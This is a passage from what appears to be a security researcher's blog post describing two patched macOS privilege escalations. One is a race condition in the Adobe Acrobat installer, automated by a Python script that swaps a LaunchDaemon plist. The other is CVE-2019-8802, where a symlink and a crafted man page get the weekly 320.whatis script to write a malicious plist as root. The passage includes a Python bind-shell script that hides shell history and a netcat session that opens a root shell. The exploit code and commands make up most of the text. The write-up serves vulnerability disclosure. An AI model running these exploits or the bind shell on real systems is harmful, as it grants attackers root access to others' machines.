</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#f60">1</span> root  wheel  <span style="color:#f60">176000</span> Jul <span style="color:#f60">31</span> 16:35 com.adobe.ARMDC.Communicator
</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#f60">1</span> root  wheel  <span style="color:#f60">184528</span> Jul <span style="color:#f60">31</span> 16:35 com.adobe.ARMDC.SMJobBlessHelper
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>com.adobe.AcrobatRefreshManager//Adobe Acrobat Updater.app/Contents/Resources:
</span></span><span style="display:flex;"><span>total <span style="color:#f60">480</span>
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel  <span style="color:#f60">244307</span> Jul <span style="color:#f60">31</span> 16:35 app.icns
</span></span></code></pre></div><p>During the installation the following files will be copied into <code>/Library/LaunchDaemons</code>.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel     <span style="color:#f60">474</span> Jul <span style="color:#f60">31</span> 16:35 ARMNextCommunicator-Launchd.plist
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel     <span style="color:#f60">486</span> Jul <span style="color:#f60">31</span> 16:35 SMJobBlessHelper-Launchd.plist
</span></span></code></pre></div><p>With a new name:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ls -l /Library/LaunchDaemons/ | grep adobe
</span></span><span style="display:flex;"><span>total <span style="color:#f60">144</span>
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel   <span style="color:#f60">474</span> Nov <span style="color:#f60">11</span> 19:20 com.adobe.ARMDC.Communicator.plist
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  wheel   <span style="color:#f60">486</span> Nov <span style="color:#f60">11</span> 19:20 com.adobe.ARMDC.SMJobBlessHelper.plist
</span></span></code></pre></div><p>Although these files are all owned by root, and thus we can&rsquo;t modify them, the location of these files is fixed, thus we can pre-create any of the folders / files. During installation the installer will verify if the folder already exists, and if so, delete it. However between the deletion and recreation there is enough time to recreate the folders with our user. It&rsquo;s a race condition but in my experiments I always won it.</p>
<p>The first step in our exploit is to continuously try to create the following folder:</p>
<pre tabindex="0"><code>/tmp/com.adobe.AcrobatRefreshManager/Adobe Acrobat Updater.app/Contents/Library/LaunchServices
</code></pre><p>If we succeed it means that we will own the entire folder structure. At that point it&rsquo;s ok if Adobe places there any files. Although the files themselves will be owned by root, we are still allowed to delete them as we own the directory. Once we delete the file, we can replace any of them with our own. My target is the plist file which will be copied to the <code>/Library/LaunchDaemon</code> directory. We can also easily win this race condition.</p>
<p>The entire exploit can be automated with a short python script:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">import</span> <span style="color:#0cf;font-weight:bold">os</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">import</span> <span style="color:#0cf;font-weight:bold">shutil</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">while</span>(<span style="color:#f60">1</span>):
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">try</span>:
</span></span><span style="display:flex;"><span>		os<span style="color:#555">.</span>system(<span style="color:#c30">&#34;mkdir -p </span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">/tmp/com.adobe.AcrobatRefreshManager/Adobe Acrobat Updater.app/Contents/Library/LaunchServices</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">&#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">if</span> os<span style="color:#555">.</span>stat(<span style="color:#c30">&#39;/tmp/com.adobe.AcrobatRefreshManager/Adobe Acrobat Updater.app/Contents/Library/LaunchServices/SMJobBlessHelper-Launchd.plist&#39;</span>)<span style="color:#555">.</span>st_uid <span style="color:#555">==</span> <span style="color:#f60">0</span>:
</span></span><span style="display:flex;"><span>			os<span style="color:#555">.</span>remove(<span style="color:#c30">&#34;/tmp/com.adobe.AcrobatRefreshManager/Adobe Acrobat Updater.app/Contents/Library/LaunchServices/SMJobBlessHelper-Launchd.plist&#34;</span>)
</span></span><span style="display:flex;"><span>		shutil<span style="color:#555">.</span>copy2(<span style="color:#c30">&#39;/Users/Shared/com.adobe.exploit.plist&#39;</span>, <span style="color:#c30">&#39;/tmp/com.adobe.AcrobatRefreshManager/Adobe Acrobat Updater.app/Contents/Library/LaunchServices/SMJobBlessHelper-Launchd.plist&#39;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">except</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">continue</span>
</span></span></code></pre></div><p>The contents of the plist file is the following:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#099">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#099">&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#309;font-weight:bold">&lt;plist</span> <span style="color:#309">version=</span><span style="color:#c30">&#34;1.0&#34;</span><span style="color:#309;font-weight:bold">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>Label<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;string&gt;</span>com.adobe.ARMDC.SMJobBlessHelper<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>ProgramArguments<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;array&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;string&gt;</span>/bin/bash<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;string&gt;</span>/Users/Shared/a.sh<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;/array&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>RunAtLoad<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;true/&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#309;font-weight:bold">&lt;/plist&gt;</span>
</span></span></code></pre></div><p><code>a.sh</code> is:</p>
<pre tabindex="0"><code>touch /Library/adobe.txt
</code></pre><p>As it&rsquo;s placed inside LaunchDaemons, it will run upon next boot with <code>root</code> privileges.</p>
<p>This was fixed in February 11, 2020: <a href="https://helpx.adobe.com/security/products/acrobat/apsb20-05.html"  class="external-link" target="_blank" rel="noopener">https://helpx.adobe.com/security/products/acrobat/apsb20-05.html</a></p>
<h3 id="macos-periodic-scripts---320whatis-script-privilege-escalation-to-root-cve-2019-8802">
  macOS periodic scripts - 320.whatis script privilege escalation to root (CVE-2019-8802)
  <a class="heading-link" href="#macos-periodic-scripts---320whatis-script-privilege-escalation-to-root-cve-2019-8802">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>Finally a tru privilege escalation also on macOS. This is my favorite because of the way I could affect the contents of the file.</p>
<p>macOS has a couple of maintenance scripts, that are scheduled to run via the periodic task daily / weekly / monthly. You can read more about them here:
<a href="https://macpaw.com/how-to/run-maintenance-scripts-on-macos"  class="external-link" target="_blank" rel="noopener">Why you should run maintenance scripts on macOS and how to do it</a>
<a href="https://discussions.apple.com/thread/8563234"  class="external-link" target="_blank" rel="noopener">Terminal commands, periodic etc - Apple Community</a></p>
<p>The scripts are scheduled by Apple LaunchDaemons, that can be found here:</p>
<pre tabindex="0"><code>csabymac:LaunchDaemons csaby$ ls -l /System/Library/LaunchDaemons/ | grep periodic
-rw-r--r--  1 root  wheel    887 Aug 18  2018 com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel    895 Aug 18  2018 com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel    891 Aug 18  2018 com.apple.periodic-weekly.plist
</code></pre><p>and these will  run by the <code>periodic_wrapper</code> process, which runs as root, more on this process here:
<a href="https://www.unix.com/man-page/mojave/8/periodic-wrapper"  class="external-link" target="_blank" rel="noopener">periodic-wrapper(8)  mojave man page</a></p>
<p>For example the daily PLIST looks like this:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#099">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#099">&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34; [http://www.apple.com/DTDs/PropertyList-1.0.dtd](http://www.apple.com/DTDs/PropertyList-1.0.dtd) &#34;&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#309;font-weight:bold">&lt;plist</span> <span style="color:#309">version=</span><span style="color:#c30">&#34;1.0&#34;</span><span style="color:#309;font-weight:bold">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>Label<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;string&gt;</span>com.apple.periodic-daily<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>ProgramArguments<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;array&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;string&gt;</span>/usr/libexec/periodic-wrapper<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;string&gt;</span>daily<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;/array&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>LowPriorityIO<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;true/&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>Nice<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>1<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>LaunchEvents<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;key&gt;</span>com.apple.xpc.activity<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>com.apple.periodic-daily<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>Interval<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>86400<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>GracePeriod<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>14400<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>Priority<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;string&gt;</span>Maintenance<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>AllowBattery<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;false/&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>Repeating<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;true/&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>AbandonProcessGroup<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;true/&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#309;font-weight:bold">&lt;/plist&gt;</span>
</span></span></code></pre></div><p>There is a weekly script run by the periodic process as root (just like all the other scripts), found here: <code>/etc/periodic/weekly/320.whatis</code></p>
<p>This script will recreate the whatis database and it will do this with root privileges as we can see through the Monitor.app. It invokes the <code>makewhatis</code> embedded executable to rebuild the database.</p>
<p><img src="https://theevilbit.github.io/images/Exploiting_directory_permissions_on_macOS/Screenshot%202019-08-15%20at%2016.36.10.png" alt=""></p>
<p>The <code>makewhatis</code> utility will get the man paths, where <code>/usr/local/share/man</code> is also included. What makes this folder special is that the normal admin user has write access to this without root privileges.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -l /usr/local/share/
</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#f60">22</span> csaby  wheel   <span style="color:#f60">704</span> Aug <span style="color:#f60">15</span> 16:26 man
</span></span></code></pre></div><p>If we check further we can see that we also have access to all underlying directories, which is important:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mac:man csaby$ ls -l
</span></span><span style="display:flex;"><span>total <span style="color:#f60">0</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x     <span style="color:#f60">3</span> csaby  wheel     <span style="color:#f60">96</span> Apr <span style="color:#f60">13</span>  <span style="color:#f60">2018</span> de
</span></span><span style="display:flex;"><span>drwxr-xr-x     <span style="color:#f60">3</span> csaby  wheel     <span style="color:#f60">96</span> Apr <span style="color:#f60">13</span>  <span style="color:#f60">2018</span> es
</span></span><span style="display:flex;"><span>drwxr-xr-x     <span style="color:#f60">3</span> csaby  wheel     <span style="color:#f60">96</span> Apr <span style="color:#f60">13</span>  <span style="color:#f60">2018</span> fr
</span></span><span style="display:flex;"><span>drwxr-xr-x     <span style="color:#f60">3</span> csaby  wheel     <span style="color:#f60">96</span> Apr <span style="color:#f60">13</span>  <span style="color:#f60">2018</span> hr
</span></span><span style="display:flex;"><span>drwxr-xr-x     <span style="color:#f60">3</span> csaby  wheel     <span style="color:#f60">96</span> Apr <span style="color:#f60">13</span>  <span style="color:#f60">2018</span> hu
</span></span><span style="display:flex;"><span>drwxr-xr-x     <span style="color:#f60">3</span> csaby  wheel     <span style="color:#f60">96</span> Apr <span style="color:#f60">13</span>  <span style="color:#f60">2018</span> it
</span></span><span style="display:flex;"><span>drwxr-xr-x     <span style="color:#f60">3</span> csaby  wheel     <span style="color:#f60">96</span> Apr <span style="color:#f60">13</span>  <span style="color:#f60">2018</span> ja
</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#f60">569</span> csaby  wheel  <span style="color:#f60">18208</span> Aug <span style="color:#f60">15</span> 16:26 man1
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">2971</span> csaby  admin  <span style="color:#f60">95072</span> Jun  <span style="color:#f60">2</span> 20:18 man3
</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#f60">20</span> csaby  wheel    <span style="color:#f60">640</span> Jun  <span style="color:#f60">2</span> 20:18 man5
</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#f60">32</span> csaby  wheel   <span style="color:#f60">1024</span> Jun  <span style="color:#f60">2</span> 20:18 man7
</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#f60">22</span> csaby  wheel    <span style="color:#f60">704</span> Jun  <span style="color:#f60">2</span> 15:38 man8
</span></span><span style="display:flex;"><span>drwxr-xr-x     <span style="color:#f60">3</span> csaby  wheel     <span style="color:#f60">96</span> Apr <span style="color:#f60">13</span>  <span style="color:#f60">2018</span> pl
</span></span><span style="display:flex;"><span>drwxr-xr-x     <span style="color:#f60">3</span> csaby  wheel     <span style="color:#f60">96</span> Apr <span style="color:#f60">13</span>  <span style="color:#f60">2018</span> pt_BR
</span></span><span style="display:flex;"><span>drwxr-xr-x     <span style="color:#f60">3</span> csaby  wheel     <span style="color:#f60">96</span> Apr <span style="color:#f60">13</span>  <span style="color:#f60">2018</span> pt_PT
</span></span><span style="display:flex;"><span>drwxr-xr-x     <span style="color:#f60">3</span> csaby  wheel     <span style="color:#f60">96</span> Apr <span style="color:#f60">13</span>  <span style="color:#f60">2018</span> ro
</span></span><span style="display:flex;"><span>drwxr-xr-x     <span style="color:#f60">3</span> csaby  wheel     <span style="color:#f60">96</span> Apr <span style="color:#f60">13</span>  <span style="color:#f60">2018</span> ru
</span></span><span style="display:flex;"><span>drwxr-xr-x     <span style="color:#f60">3</span> csaby  wheel     <span style="color:#f60">96</span> Apr <span style="color:#f60">13</span>  <span style="color:#f60">2018</span> sk
</span></span><span style="display:flex;"><span>drwxr-xr-x     <span style="color:#f60">3</span> csaby  wheel     <span style="color:#f60">96</span> Apr <span style="color:#f60">13</span>  <span style="color:#f60">2018</span> zh
</span></span></code></pre></div><p>Since <code>makewhatis</code> will create a file called <code>whatis.tmp</code> and we can create symlinks here, we can redirect this file write to somewhere else. I will chose the folder <code>/Library/LaunchDaemons</code>. If we can place a specially crafted <code>plist</code> file here, it will be loaded by the system as root upon boot time. The same idea as with the Adobe installer.</p>
<p><code>makewhatis</code> will create the <code>whatis</code> database in the following format:</p>
<pre tabindex="0"><code>FcAtomicCreate(3)        - create an FcAtomic object
FcAtomicDeleteNew(3)     - delete new file
FcAtomicDestroy(3)       - destroy an FcAtomic object
FcAtomicLock(3)          - lock a file
FcAtomicNewFile(3)       - return new temporary file name
FcAtomicOrigFile(3)      - return original file name
</code></pre><p>The first is the name on the man page derived from the file, and the second is the description taken from the NAME section of the man page. I opted to place my custom PLIST under the NAME section, like this:</p>
<pre tabindex="0"><code>.SH NAME
7z - &lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE plist PUBLIC &#34;-//Apple Computer//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;&lt;plist version=&#34;1.0&#34;&gt;&lt;dict&gt;&lt;key&gt;Label&lt;/key&gt;&lt;string&gt;com.sample.Load&lt;/string&gt;&lt;key&gt;ProgramArguments&lt;/key&gt;&lt;array&gt; &lt;string&gt;/Applications/Scripts/sample.sh&lt;/string&gt;&lt;/array&gt;&lt;key&gt;RunAtLoad&lt;/key&gt;&lt;true/&gt;&lt;/dict&gt;&lt;/plist&gt;&lt;!--
</code></pre><p>The <code>&lt;--</code> at the end is important as we need to comment out the rest of the database in order to get a proper PLIST file, which is in XML format.</p>
<p>We still need to solve 2 issues:</p>
<ol>
<li>The name derived from the filename should make sense in XML, otherwise we get a format error, and the PLIST won&rsquo;t be loaded</li>
<li>Our custom man page has to be the first to be added to the database in order to comment out the rest of the items</li>
</ol>
<p>To solve #2 let’s be sure that we don’t have any man page starting with a number, if we have let’s rename them. I had multiple <code>7z</code> man pages, so I added an <code>a</code> before the number to move it down.</p>
<p>To solve the first issue the name of our file should look like this:</p>
<pre tabindex="0"><code>&lt;!--7z.1
</code></pre><p>This is a valid(!) filename on macOS, I took the original <code>7z.1</code> man page and renamed it:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mv 7z.1 <span style="color:#c30;font-weight:bold">\&lt;\!</span>--7z.1
</span></span></code></pre></div><p>We will need to close this comment, so my new NAME section looks like this:</p>
<pre tabindex="0"><code>.SH NAME
7z - --&gt;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE plist PUBLIC &#34;-//Apple Computer//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;&lt;plist version=&#34;1.0&#34;&gt;&lt;dict&gt;&lt;key&gt;Label&lt;/key&gt;&lt;string&gt;com.sample.Load&lt;/string&gt;&lt;key&gt;ProgramArguments&lt;/key&gt;&lt;array&gt; &lt;string&gt;/Applications/Scripts/sample.sh&lt;/string&gt;&lt;/array&gt;&lt;key&gt;RunAtLoad&lt;/key&gt;&lt;true/&gt;&lt;/dict&gt;&lt;/plist&gt;&lt;!--
</code></pre><p>Let’s create our symlink:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ln -s /Library/LaunchDaemons/com.sample.Load.plist whatis.tmp
</span></span></code></pre></div><p>We can simulate the execution of the periodic script via this command:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /bin/sh - /etc/periodic/weekly/320.whatis 
</span></span></code></pre></div><p>or</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo periodic weekly
</span></span></code></pre></div><p>If we check, we got a file, and it starts like this:</p>
<pre tabindex="0"><code>&lt;!--7z(1)                - --&gt;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE plist PUBLIC &#34;-//Apple Computer//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;&lt;plist version=&#34;1.0&#34;&gt;&lt;dict&gt;&lt;key&gt;Label&lt;/key&gt;&lt;string&gt;com.sample.Load&lt;/string&gt;&lt;key&gt;ProgramArguments&lt;/key&gt;&lt;array&gt; &lt;string&gt;/Applications/Scripts/sample.sh&lt;/string&gt;&lt;/array&gt;&lt;key&gt;RunAtLoad&lt;/key&gt;&lt;true/&gt;&lt;/dict&gt;&lt;/plist&gt;&lt;!
</code></pre><p>If we load this plist file, it will try to execute the script at <code>/Applications/Scripts/sample.sh</code>. The location is arbitrary.
I put this into the script above (be sure to give it execute permissions <code>chmod +x /Applications/Scripts/sample.sh</code>)</p>
<pre tabindex="0"><code>/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal
</code></pre><p>If we don’t want to reboot the computer we can simulate the load of the PLIST file with:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo launchctl load com.sample.Load.plist 
</span></span></code></pre></div><p>If we want to properly simulate this with a reboot, we can’t start a Terminal, as we won’t see it, we need to do something else. For myself I put a bind shell into that script, and after login, connecting to it I got a root shell, but it’s up to you what you put there. The script contents in this case:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#sample.sh</span>
</span></span><span style="display:flex;"><span>python /Applications/Scripts/bind.py
</span></span></code></pre></div><p>The python script, placed at <code>/Applications/Scripts/bind.py</code></p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#bind.py</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#!/usr/bin/python2</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">import</span> <span style="color:#0cf;font-weight:bold">os</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">import</span> <span style="color:#0cf;font-weight:bold">pty</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">import</span> <span style="color:#0cf;font-weight:bold">socket</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>lport <span style="color:#555">=</span> <span style="color:#f60">31337</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">main</span>():
</span></span><span style="display:flex;"><span>    s <span style="color:#555">=</span> socket<span style="color:#555">.</span>socket(socket<span style="color:#555">.</span>AF_INET, socket<span style="color:#555">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>    s<span style="color:#555">.</span>bind((<span style="color:#c30">&#39;&#39;</span>, lport))
</span></span><span style="display:flex;"><span>    s<span style="color:#555">.</span>listen(<span style="color:#f60">1</span>)
</span></span><span style="display:flex;"><span>    (rem, addr) <span style="color:#555">=</span> s<span style="color:#555">.</span>accept()
</span></span><span style="display:flex;"><span>    os<span style="color:#555">.</span>dup2(rem<span style="color:#555">.</span>fileno(),<span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>    os<span style="color:#555">.</span>dup2(rem<span style="color:#555">.</span>fileno(),<span style="color:#f60">1</span>)
</span></span><span style="display:flex;"><span>    os<span style="color:#555">.</span>dup2(rem<span style="color:#555">.</span>fileno(),<span style="color:#f60">2</span>)
</span></span><span style="display:flex;"><span>    os<span style="color:#555">.</span>putenv(<span style="color:#c30">&#34;HISTFILE&#34;</span>,<span style="color:#c30">&#39;/dev/null&#39;</span>)
</span></span><span style="display:flex;"><span>    pty<span style="color:#555">.</span>spawn(<span style="color:#c30">&#34;/bin/bash&#34;</span>)
</span></span><span style="display:flex;"><span>    s<span style="color:#555">.</span>close()
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> __name__ <span style="color:#555">==</span> <span style="color:#c30">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p>Once logged in you can login with netcat on localhost:31337:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mac:LaunchDaemons csaby$ nc 127.1 <span style="color:#f60">31337</span>
</span></span><span style="display:flex;"><span>bash-3.2# id
</span></span><span style="display:flex;"><span>id
